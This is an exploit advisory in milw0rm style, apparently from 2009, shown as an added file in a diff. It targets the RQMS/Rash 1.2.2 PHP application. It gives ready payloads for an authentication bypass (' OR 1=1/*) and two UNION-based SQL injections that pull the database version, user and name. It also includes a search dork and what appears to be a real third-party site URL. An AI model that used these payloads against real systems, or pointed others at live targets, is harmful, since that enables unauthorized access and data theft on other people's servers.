@@ -1,0 +1,28 @@
+ ########################################
+ #                                                                   
+ # Product : RQMS                                          
+ # Version : 1.2.2                                            
+ # Dork : Rash Version: 1.2.1                           
+ # Site: http://rqms.sourceforge.net                  
+ # Found by: Dimi4                                         
+ # Greetz: UASC (http://uasc.org.ua), antichat  
+ #                                                                  
+ ########################################
+Multiple Remote Vulnerabilities
+
+Need: magic_quotes_gpc = OFF
+1)Auth BYPASS
+http://127.0.0.1/rash-v1.2.2/?admin
+Login: ' OR 1=1/*
+
+2) Sql-injection
+http://nocude.maisum.net/?admin
+http://target/rash-v1.2.2/?news_edit&id=4'+union+select+1,concat_ws(0x3a,version(),user(),database()),3/*
+
+3) Sql-inj in Search
+http://target//rash-v1.2.2/?search
+Search: ' union select database(),version(),user(),4,5,6/*
+
+# (c) Dimi4, UASC (http://uasc.org.ua)
+
+# milw0rm.com [2009-04-14]
